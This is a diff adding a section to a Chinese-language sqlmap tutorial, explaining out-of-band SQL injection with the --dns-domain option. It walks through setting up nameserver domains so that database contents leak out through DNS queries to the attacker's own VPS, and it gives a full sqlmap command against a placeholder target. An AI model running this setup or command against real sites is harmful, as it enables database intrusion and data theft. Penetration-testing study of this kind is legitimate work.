@@ -47,6 +47,19 @@ sqlmap将会测试value1的位置是否可注入。
 开始 sqli-hunter 代理 ruby sqli-hunter.rb -p 8888  
 设置浏览器代理为 8888端口，然后用鼠标去点击网页上的各种链接，会传递到sqli-hunter的代理服务器上，sqli-hunter与sqlmapapi交互检测注入点。检测到注入点会保存在tmp目录，使用sqlmap的-r参数进行注入就好了。  
 
+8). 使用sqlmap的dns-domain参数进行oob(out of band)注入
+
+使用方法：sqlmap使用--dns-domain参数时候会监听53端口，我们需要把我们获得数据所使用的域名的dns服务器配置到我们运行sqlmap的主机，就可以获得dns外带的数据。  
+因为配置dns服务器的时候也需要dns，所以我们需要两个域名，详细配置如下：  
+配置我们的用于解析dns的nameserver的域名ns1.xxx.com,ns2.xxx.com指向我们运行sqlmap的主机ip。  
+配置我们用于外带数据的域名rainism.cc的域名服务器为ns1.xxx.com和ns2.xxx.com 。  
+我们在外网的vps上执行如下命令  
+
+`sqlmap.py -u 'http://xxoo.com/index.php?id=1*' --random-agent --dns-domain='rainism.cc' -v 3`  
+
+可以看到sqlmap执行的语句和返回的数据。   
+
+
 
 ## 二、SqlMap绕过WAF实例
 apostrophemask.py UTF-8编码  
